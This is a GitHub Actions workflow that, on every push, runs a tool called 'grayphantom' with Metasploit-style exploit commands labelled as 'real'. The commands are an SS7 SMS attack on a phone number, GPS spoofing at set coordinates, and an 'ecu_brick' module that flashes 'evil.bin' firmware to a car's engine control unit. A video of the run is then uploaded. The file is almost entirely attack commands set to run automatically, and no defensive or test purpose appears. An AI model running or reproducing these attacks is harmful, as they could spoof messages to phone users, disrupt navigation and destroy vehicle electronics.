name: REAL-TEST
on: [push]
jobs:
  real:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Install real stack
        run: |
          docker-compose up -d
      - name: Real SS7 SMS
        run: |
          ./grayphantom -x 'use exploit/telecom/ss7_send_sms; set TARGET +905551234567; exploit'
      - name: Real GPS spoof
        run: |
          ./grayphantom -x 'use exploit/hardware/gps_spoof; set LAT 40.7128; set LON -74.0060; exploit'
      - name: Real ECU brick
        run: |
          ./grayphantom -x 'use exploit/automotive/ecu_brick; set FIRMWARE evil.bin; exploit'
      - name: Upload real video
        uses: actions/upload-artifact@v4
        with:
          name: real-test.mp4
          path: tests/real_test.mp4